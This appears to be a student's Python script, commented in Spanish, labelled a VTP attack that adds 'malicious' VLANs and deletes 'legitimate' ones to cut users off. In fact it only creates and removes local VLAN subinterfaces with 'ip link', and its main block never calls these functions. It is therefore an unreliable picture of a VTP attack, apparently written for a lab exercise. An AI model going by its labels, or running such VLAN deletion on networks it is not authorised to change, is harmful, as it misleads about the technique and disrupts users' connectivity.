#!/usr/bin/env python3
# ============================================
# VTP Attack Script
# Autor: Emely Ventura
# Matricula: 20241140
# Descripcion: Agrega y elimina VLANs
#              simulando ataque VTP
# Parametros: Sin parametros externos
# Requisitos: Python3, acceso a red del switch
# ============================================

import subprocess
import time

def mostrar_estado(momento):
    print(f"\n{'='*50}")
    print(f"  VLANS {momento} DEL ATAQUE")
    print(f"{'='*50}")
    subprocess.run(["ip", "link", "show"])

def agregar_vlan(vlan_id):
    print(f"\n[*] Agregando VLAN {vlan_id} maliciosa...")
    subprocess.run([
        "ip", "link", "add", "link", "eth1",
        "name", f"eth1.{vlan_id}",
        "type", "vlan", "id", str(vlan_id)
    ])
    subprocess.run(["ip", "link", "set", f"eth1.{vlan_id}", "up"])
    print(f"[+] VLAN {vlan_id} agregada exitosamente")

def borrar_vlan(vlan_id):
    print(f"\n[*] Borrando VLAN {vlan_id} legitima...")
    subprocess.run(
        ["ip", "link", "delete", f"eth1.{vlan_id}"],
        capture_output=True
    )
    print(f"[+] VLAN {vlan_id} eliminada")
    print(f"[!] Usuarios de VLAN {vlan_id} sin conectividad")

if __name__ == "__main__":
    print("="*50)
    print("  VTP ATTACK - Emely Ventura | 20241140")
    print("="*50)
